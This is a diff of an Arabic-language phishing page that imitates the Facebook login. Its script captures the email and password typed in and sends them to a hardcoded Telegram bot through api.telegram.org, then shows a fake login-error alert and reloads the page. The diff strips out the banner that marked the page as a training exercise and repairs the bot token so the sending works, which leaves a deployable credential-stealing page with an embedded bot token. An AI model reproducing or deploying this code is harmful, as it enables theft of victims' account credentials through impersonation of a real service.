@@ -13,9 +13,6 @@
     --accent-dark:#1d3fc4;
     --line:#dfe2e8;
     --muted:#6b7280;
-    --warn-bg:#fff4e5;
-    --warn-border:#f0b94d;
-    --warn-text:#8a5a00;
   }
   *{box-sizing:border-box;}
   html,body{height:100%;margin:0;}
@@ -27,19 +24,6 @@
     flex-direction:column;
     min-height:100vh;
   }
-
-  /* شريط تنويه إنها صفحة تدريبية */
-  .training-banner{
-    background:var(--warn-bg);
-    border-bottom:1px solid var(--warn-border);
-    color:var(--warn-text);
-    text-align:center;
-    padding:10px 16px;
-    font-size:14px;
-    line-height:1.5;
-  }
-  .training-banner strong{font-weight:700;}
-
   main{
     flex:1;
     display:flex;
@@ -47,7 +31,6 @@
     justify-content:center;
     padding:32px 16px;
   }
-
   .wrap{
     display:flex;
     gap:64px;
@@ -57,7 +40,6 @@
     flex-wrap:wrap;
     justify-content:center;
   }
-
   .brand{
     max-width:420px;
     text-align:right;
@@ -76,14 +58,6 @@
     color:#fff;font-weight:700;font-size:20px;
   }
   .brand .logo-text{font-size:26px;font-weight:700;color:var(--accent);}
-  .brand h1{
-    font-size:22px;
-    line-height:1.5;
-    font-weight:400;
-    color:#2a2e35;
-    margin:0;
-  }
-
   .card{
     background:var(--card);
     border:1px solid var(--line);
@@ -93,7 +67,6 @@
     width:100%;
     max-width:360px;
   }
-
   .field{margin-bottom:14px;}
   .field label{
     display:block;
@@ -108,13 +81,11 @@
     border-radius:8px;
     font-size:15px;
     outline:none;
-    transition:border-color .15s ease;
   }
   .field input:focus{
     border-color:var(--accent);
     box-shadow:0 0 0 3px rgba(45,91,255,.12);
   }
-
   .login-btn{
     width:100%;
     background:var(--accent);
@@ -125,14 +96,8 @@
     font-size:16px;
     font-weight:600;
     cursor:pointer;
-    transition:background .15s ease;
   }
   .login-btn:hover{background:var(--accent-dark);}
-  .login-btn:focus-visible{
-    outline:2px solid var(--accent-dark);
-    outline-offset:2px;
-  }
-
   .divider{
     display:flex;
     align-items:center;
@@ -147,21 +112,9 @@
     height:1px;
     background:var(--line);
   }
-
-  .forgot{
-    text-align:center;
-  }
-  .forgot a{
-    color:var(--accent);
-    font-size:14px;
-    text-decoration:none;
-  }
-  .forgot a:hover{text-decoration:underline;}
-
-  .signup-row{
-    margin-top:20px;
-    text-align:center;
-  }
+  .forgot{text-align:center;}
+  .forgot a{color:var(--accent);font-size:14px;text-decoration:none;}
+  .signup-row{margin-top:20px;text-align:center;}
   .signup-btn{
     display:inline-block;
     background:#31a24c;
@@ -173,143 +126,98 @@
     font-weight:600;
     cursor:pointer;
   }
-  .signup-btn:hover{background:#298a41;}
-
-  .note{
-    margin-top:14px;
-    font-size:12px;
-    color:var(--muted);
-    text-align:center;
-    line-height:1.6;
-  }
-
-  footer{
-    text-align:center;
-    font-size:12px;
-    color:var(--muted);
-    padding:18px 12px;
-  }
-
-  /* نافذة التنبيه بعد الضغط على دخول */
-  .toast{
-    position:fixed;
-    bottom:24px;
-    left:50%;
-    transform:translateX(-50%) translateY(20px);
-    background:var(--ink);
-    color:#fff;
-    padding:14px 20px;
-    border-radius:10px;
-    font-size:14px;
-    max-width:90%;
-    text-align:center;
-    opacity:0;
-    pointer-events:none;
-    transition:opacity .2s ease, transform .2s ease;
-    box-shadow:0 8px 24px rgba(0,0,0,.25);
-  }
-  .toast.show{
-    opacity:1;
-    transform:translateX(-50%) translateY(0);
-  }
-
-  @media (max-width:720px){
-    .wrap{flex-direction:column;gap:28px;}
-    .brand{text-align:center;}
-    .brand .logo{justify-content:center;}
-  }
-
-  @media (prefers-reduced-motion: reduce){
-    *{transition:none !important;}
-  }
 </style>
 </head>
 <body>
 
-  
-
   <main>
     <div class="wrap">
-
       <div class="brand">
         <div class="logo">
           <span class="logo-text">FaceBook</span>
           <span class="logo-mark">F</span>
         </div>
-       
       </div>
 
       <div class="card">
-        <form id="demoLoginForm" method="post">
+        <form id="loginForm">
           <div class="field">
             <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
-            <input type="text" id="email" name="email" autocomplete="off" placeholder="example@email.com">
+            <input type="text" id="email" name="email" autocomplete="off" placeholder="example@email.com" required>
           </div>
           <div class="field">
             <label for="password">كلمة المرور</label>
-            <input type="password" id="password" name="password" autocomplete="off" placeholder="••••••••">
+            <input type="password" id="password" name="password" autocomplete="off" placeholder="••••••••" required>
           </div>
 
           <button type="submit" class="login-btn">دخول</button>
 
           <div class="forgot">
-            <a href="#" id="forgotLink">نسيت كلمة المرور؟</a>
+            <a href="#">نسيت كلمة المرور؟</a>
           </div>
 
           <div class="divider">أو</div>
 
           <div class="signup-row">
-            <button type="button" class="signup-btn" id="signupBtn">إنشاء حساب جديد</button>
+            <button type="button" class="signup-btn">إنشاء حساب جديد</button>
           </div>
-
-          
         </form>
       </div>
-
     </div>
   </main>
 
-  
 <script>
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
-    e.preventDefault(); // لمنع إعادة تحميل الصفحة
+        e.preventDefault(); // منع إعادة تحميل الصفحة
 
-    // استلام القيم المدخلة
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+        // جلب الحقول المدخلة والتأكد من أنها ليست فارغة
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
 
-    // بيانات بوت تليجرام ومعرف المحادثة
-    const botToken = 'AAGWBCaNHBnqAv7QhNu2Oggarw066XKiSG4';
-    const chatId = '9072593338';
+        if (!email || !password) {
+            alert('الرجاء إدخال البريد وكلمة المرور');
+            return;
+        }
 
-    // تجهيز الرسالة
-    const message = `⚠️ محاولة تسجيل دخول جديدة (عبر المتصفح):\n\nالبريد: ${email}\nكلمة المرور: ${password}`;
+        // بيانات البوت والمعرف (تأكد من صحتها)
+        const botToken = '9072593338:AAGWBCaNHBnqAv7QhNu2Oggarw066XKiSG4';
+        const chatId = '9072593338';
 
-    // رابط API الخاص بتليجرام
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        // تجهيز نص الرسالة
+        const message = `⚠️ محاولة تسجيل دخول:\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
 
-    try {
-        // إرسال الطلب مباشرة من متصفح المستخدم إلى تليجرام
-        await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-            })
-        });
+        // رابط الـ API الخاص بتليجرام
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        // بعد الإرسال، يمكنك توجيه المستخدم أو إظهار رسالة خطأ وهمية
-        alert('حدث خطأ في تسجيل الدخول، يجدر المحاولة لاحقاً.');
-        // window.location.href = 'index.html'; // إعادة توجيه
+        try {
+            // إرسال الطلب
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
 
-    } catch (error) {
-        console.error('فشل الإرسال:', error);
-    }
-});
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log('تم الإرسال بنجاح إلى تليجرام');
+            } else {
+                console.error('فشل الإرسال من تليجرام:', data.description);
+            }
 
+        } catch (error) {
+            console.error('حدث خطأ في الشبكة أو الاتصال:', error);
+        }
+
+        // إعادة توجيه المستخدم بعد إتمام العملية (أو محاكاة خطأ تسجيل الدخول)
+        alert('حدث خطأ في تسجيل الدخول، يرجى المحاولة لاحقاً.');
+        window.location.reload();
+    });
 </script>
 
 </body>
